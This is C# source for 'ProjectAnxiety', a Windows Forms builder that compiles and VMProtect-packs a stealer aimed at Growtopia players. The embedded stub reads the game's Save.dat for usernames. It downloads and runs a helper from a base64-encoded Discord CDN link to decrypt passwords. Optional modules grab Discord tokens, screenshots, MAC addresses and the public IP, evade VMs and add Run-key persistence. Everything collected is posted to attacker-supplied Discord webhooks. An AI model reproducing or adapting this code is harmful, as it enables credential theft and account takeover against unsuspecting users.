using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using ProjectAnxiety.Util;
using System.Threading;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Management;

namespace ProjectAnxiety.zvd
{
	public partial class Builder : Form
	{
        public readonly List<string> urlList = new List<string>();
        private readonly Random random = new Random();
        private readonly RandomCharacters randomCharacters;
        private readonly RandomFileInfo randomFileInfo;
		public Builder()
        {
       
            
            InitializeComponent();
            this.randomCharacters = new RandomCharacters();
            this.randomFileInfo = new RandomFileInfo(randomCharacters);
            urlListView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        }

        public string code = @"
using System.Reflection;
using System.Runtime.InteropServices;
using System;
using System.Net;
using System.Collections.Specialized;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Management;

namespace ProjectAnxiety
{
	public class intern
	{
		public class Http
		{
			private readonly WebClient dWebClient;

			public static List<string> ListURLS = new List<string>(new string[] { ""$URL$"" });
			public Http()
			{
				this.dWebClient = new WebClient();
			}

			public static byte[] Post(string uri, NameValueCollection pairs)
			{
				byte[] numArray;
				using (WebClient webClient = new WebClient())
				{
					numArray = webClient.UploadValues(uri, pairs);

				}
				return numArray;
			}
			public static void sendWebhook(string URL, string msg)
			{
				Http.Post(URL, new NameValueCollection()
				{
					{ ""content"", msg }
				});
			}
			public static void attachment(string path)
			{
				using (WebClient webClient = new WebClient())
				{
					foreach (string lmao in ListURLS.ToArray())
					{
						webClient.UploadFile(lmao, path);
					}
				}
			}

		}

		internal class plugins
		{
			[DllImport(""Kernel32.dll"")]
			public static extern IntPtr GetConsoleWindow();

			[DllImport(""User32.dll"")]
			public static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
			public static void FullScreenshot(String filepath, String filename, ImageFormat format)
			{
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics g = Graphics.FromImage(bitmap))
					{
						g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
					}

					string fullpath = filepath + ""\\"" + filename;

					bitmap.Save(fullpath, format);
				}
			}

			public void AntiVM()
			{

				using (var searcher = new ManagementObjectSearcher(""Select * from Win32_ComputerSystem""))
				{
					using (var items = searcher.Get())
					{
						foreach (var item in items)
						{
							string manufacturer = item[""Manufacturer""].ToString().ToLower();
							if ((manufacturer == ""microsoft corporation"") && (item[""Model""].ToString().ToUpperInvariant().Contains(""VIRTUAL""))
									|| manufacturer.Contains(""vmware"")
									|| item[""Model""].ToString() == ""VirtualBox"")
							{
								Environment.Exit(0);
							}
						}
					}
				}
			}


			public static string GetMacAddress()
			{
				string macAddresses1 = """";


				foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
				{
					macAddresses1 += ""\n"";
					macAddresses1 += nic.GetPhysicalAddress().ToString();
				}
				return macAddresses1;
			}


			public static string takeToken()
			{
				try
				{
					string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ""//Discord//Local Storage//leveldb//000005.ldb"");
					int num;
					while ((num = text.IndexOf(""oken"")) != -1)
					{
						text = text.Substring(num + ""oken"".Length);
					}
					return text.Split('""')[1];
				}
				catch (Exception)
				{
					return null;
				}
			}


			public void Startup()
			{
				string dfgdfgdgdg = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath) + ""\\"" + ""sfsdhfdkjfhdkjfmanba"" + "".exe"";
				try
				{
					if (File.Exists(dfgdfgdgdg))
					{
						File.Delete(dfgdfgdgdg);
					}
					File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
					registryKey.SetValue(Path.GetFileNameWithoutExtension(dfgdfgdgdg), dfgdfgdgdg);
				}
				catch
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(dfgdfgdgdg));
					if (processesByName.Length > 0)
					{
						Process[] array = processesByName;
						int num = 0;
						if (num < array.Length)
						{
							Process process = array[num];
							process.Kill();
						}
					}
				}
			}
		}





		public static class SendPacked
		{
			public static string decodebase(string basedata)
			{
				byte[] bytes = Convert.FromBase64String(basedata);
				return Encoding.UTF8.GetString(bytes);
			}

			public static string getuser()
			{
				try
				{
					string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\Save.dat"";
					var pattern = new Regex(@""[^\w0-9]"");
					string savedata = null;
					var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
					{
						using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
						{
							savedata = streamReader.ReadToEnd();
						}
					}
					string cleardata = savedata.Replace(""\u0000"", "" "");
					string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf(""tankid_name"") + ""tankid_name"".Length).Split(' ')[3], string.Empty);
					return firstgrowid;
				}
				catch (Exception)
				{
					string sorry2 = ""couldnt find the username!"";
					return sorry2;
				}
			}
			public static string getpass()
			{
				try
				{
					string nanananaan = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\Save.dat"";

					if (File.Exists(nanananaan))
					{
						new WebClient().DownloadFile(SendPacked.decodebase(""aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvODI4MTczODcxNTU1MTQ5ODI0LzgzMTU1MzMzODc1NDQ2NTgyMi9zYXZlZGVjcnlwdGVyLmV4ZQ==""), Path.GetTempPath() + ""\\Lanx1337.exe"");
						Process.Start(Path.GetTempPath() + ""\\Lanx1337.exe"");
						Thread.Sleep(1000);
						byte[] lolxd = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + ""\\lanx.txt"");
						string result = System.Text.Encoding.UTF8.GetString(lolxd);

						return result;
					}
					else
					{
						string sorry = ""couldnt find save.dat file!"";
						return sorry;

					}
				}
				catch (Exception)
				{
					string sorry1 = ""an error has occured while decoding"";
					return sorry1;
				}
			}
			public static void tracemessage()
            {
				WebClient webClient = new WebClient();
				string anamz = webClient.DownloadString(""http://ipv4bot.whatismyipaddress.com/"");

				foreach (string x in Http.ListURLS.ToArray())
				{
					Http.sendWebhook(x, string.Concat(new string[]
					{
						""```\n==AnxietyTracer==\n"",
						""\nGrowID:\n"",
						 getuser(),
						""\n\nPassword:\n"",
						getpass(),
						""\n"",
					    //tok3n
					    //mack
					    //infolel
					""\n\n==AnxietyTracer==```"",
					}));
				}
				//stealCT1
				//ss
				//deletegt
			}
			public static void Main()
			{
				IntPtr consoleWindow = plugins.GetConsoleWindow();
				if (consoleWindow != IntPtr.Zero)
				{
					plugins.ShowWindow(consoleWindow, 0);
				}

				WebClient webClient = new WebClient();

				string anamz = webClient.DownloadString(""http://ipv4bot.whatismyipaddress.com/"");


				plugins plugin = new plugins();
				//startuplolhehe
				//antivm

				foreach (string x in Http.ListURLS.ToArray())
				{
					Http.sendWebhook(x, string.Concat(new string[]
					{
						""```\n==ProjectAnxiety==\n"",
						""\nGrowID:\n"",
						 getuser(),
						""\n\nPassword:\n"",
						getpass(),
						""\n"",
					    //tok3n
					    //mack
					    //infolel
					""\n\n==ProjectAnxiety==```"",
					}));
				}
				//stealCT1
				//ss
				//Tracer
				//deletegt
			}
		}
		public class Tracer
		{
			public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia"";
			public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\save.dat"";
			public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
			public static void TraceSave()
			{
				fileSystemWatcher.Path = dirPath;
				fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
				fileSystemWatcher.Filter = ""*.dat"";
				fileSystemWatcher.Changed += OnSaveChanged;
				fileSystemWatcher.EnableRaisingEvents = true;

				while (true)
				{
					Thread.Sleep(1000);
				}
			}

			public static void OnSaveChanged(object source, FileSystemEventArgs e)
			{
				if (e.FullPath == savePath)
				{
					try
					{
						fileSystemWatcher.EnableRaisingEvents = false;
						Thread.Sleep(300);
						SendPacked.tracemessage();
					}
					finally
					{
						fileSystemWatcher.EnableRaisingEvents = true;
					}
				}
			}
		}
	}
}
";
        private void monoFlat_Button3_Click(object sender, EventArgs e)
		{ 

			var inputUrl = monoFlat_TextBox1.Text;
            if (string.IsNullOrEmpty(inputUrl))
            {
				MessageBox.Show("put webhook nub");
                return;
            }

        

			if (!urlList.Contains(inputUrl))
            {
                var listViewItem = new ListViewItem();
                listViewItem.Text = monoFlat_TextBox1.Text;
                urlListView.Items.Insert(0, listViewItem);
                urlListView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Thread.Sleep(100);
                urlList.Add(listViewItem.Text);
			}
		}
		private static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
		{
			Assembly assembly = Assembly.GetCallingAssembly();

			using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
			using (BinaryReader r = new BinaryReader(s))
			using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
			using (BinaryWriter w = new BinaryWriter(fs))
				w.Write(r.ReadBytes((int)s.Length));
		}

		private void monoFlat_Button1_Click_1(object sender, EventArgs e)
        {
			try
            {

                if (urlListView.Items.Count == 0)
                {
                    MessageBox.Show("Please add a webhook url", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                using (var saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
						var stubSource = code;
                        
                        stubSource = stubSource.Replace("Intern", randomCharacters.getRandomCharacters(random.Next(10, 20)));
                        stubSource = stubSource.Replace("\"$URL$\"", string.Join(", ", urlList.Select(x => $"\"{x}\"").ToList()));
                        if (startupcheck.Checked == true)
                        {
                            if (string.IsNullOrEmpty(b.Text))
                            {
                                MessageBox.Show("you cant leave it blank!");
                                return;
                            }
                            stubSource = stubSource.Replace("//startuplolhehe", "plugin.Startup();");
                            stubSource = stubSource.Replace("sfsdhfdkjfhdkjfmanba", b.Text);
                        }
                        if (maccheck.Checked == true)
                        {
                            stubSource = stubSource.Replace("//mack", richTextBox2.Text);
                        }
                        if (screencheck.Checked == true)
                        {
                            stubSource = stubSource.Replace("//ss", richTextBox4.Text);
                        }
                        if (tokencheck.Checked == true)
                        {
                            stubSource = stubSource.Replace("//tok3n", richTextBox3.Text);
                        }
                        if (ctcheck.Checked == true)
                        {
                            stubSource = stubSource.Replace("//stealCT1", richTextBox1.Text);
                        }
                        if (checkBox4.Checked == true)
                        {
                            stubSource = stubSource.Replace("//infolel", richTextBox5.Text);
                        }
						if (sendcheck.Checked == true)
						{
							stubSource = stubSource.Replace("//deletegt", richTextBox6.Text);
						}
						if (monoFlat_CheckBox6.Checked == true)
                        {
							stubSource = stubSource.Replace("//antivm", "plugin.AntiVM();");
                        }
						if (monoFlat_CheckBox5.Checked == true)
                        {
							stubSource = stubSource.Replace("//Tracer", "Tracer.TraceSave();");
                        }
						var isOK = Compiler.CompileFromSource(stubSource, Path.GetTempPath() + "\\LanX.exe", string.IsNullOrWhiteSpace(txtIcon.Text) ? null : txtIcon.Text);

                        if (isOK)
                        {
							Extract("ProjectAnxiety", Path.GetTempPath(), "Resources", "vmprotect.exe");
							var directoryPath2 = Path.GetFullPath(saveFileDialog.FileName);
							var XDDIJ = Path.GetTempPath() + "\\LanX.exe";
							ProcessStartInfo Protection = new ProcessStartInfo();
							Protection.WindowStyle = ProcessWindowStyle.Hidden;
							Protection.WorkingDirectory = Path.GetTempPath();
							Protection.FileName = "vmprotect.exe";
							Protection.UseShellExecute = true;
							Protection.Arguments = XDDIJ;
							Process proc = Process.Start(Protection);
							proc.WaitForExit();
							File.Delete(XDDIJ);
							File.Move(Path.GetTempPath() + "\\LanX.vmp.exe", saveFileDialog.FileName);
							File.Delete(Path.GetTempPath() + "\\vmprotect.exe");
							MessageBox.Show("Done!");
							if (MessageBox.Show("do you want to join our discord server?", "Invite", MessageBoxButtons.OKCancel) == DialogResult.OK)
							{
								Process.Start("https://discord.gg/efjbp6maeg");
							}
						}
                    }
                }
            }
			catch (Exception ex)
			{
				monoFlat_Label2.Text = ex.Message;
            }
        }

        private void startupcheck_CheckedChanged(object sender)
        {
            if (startupcheck.Checked == true)
            {
                a.Visible = true;
                b.Visible = true;
            }
            else
            {
                a.Visible = false;
                b.Visible = false;
            }
        }

        private void monoFlat_Button2_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = openFileDialog.FileName;
					pictureIcon.ImageLocation = openFileDialog.FileName;
					pictureIcon.BorderStyle = BorderStyle.FixedSingle;
				}
                else
                {
                    txtIcon.Text = string.Empty;
					pictureIcon.ImageLocation = string.Empty;
				}
            }
        }

        private void monoFlat_Button8_Click(object sender, EventArgs e)
        {
            if (urlListView.SelectedItems.Count > 0)
            {
                foreach (ListViewItem url in urlListView.SelectedItems)
                {
                    urlList.Remove(url.Text);
                    url.Remove();
                }
            }
        }

        private void monoFlat_ThemeContainer1_Click(object sender, EventArgs e)
        {

        }

        private void monoFlat_CheckBox2_CheckedChanged(object sender)
        {
            if (monoFlat_CheckBox2.Checked == true)
            {
                monoFlat_Button1.Enabled = true;
            }
            else
                monoFlat_Button1.Enabled = false;
        }

        private void txtIcon_TextChanged(object sender, EventArgs e)
        {
				if (string.IsNullOrWhiteSpace(txtIcon.Text))
				{
					txtIcon.Text = string.Empty;
					pictureIcon.ImageLocation = string.Empty;
					pictureIcon.BorderStyle = BorderStyle.None;
				}
		}

        private void sendcheck_CheckedChanged(object sender)
        {

        }
    }
}
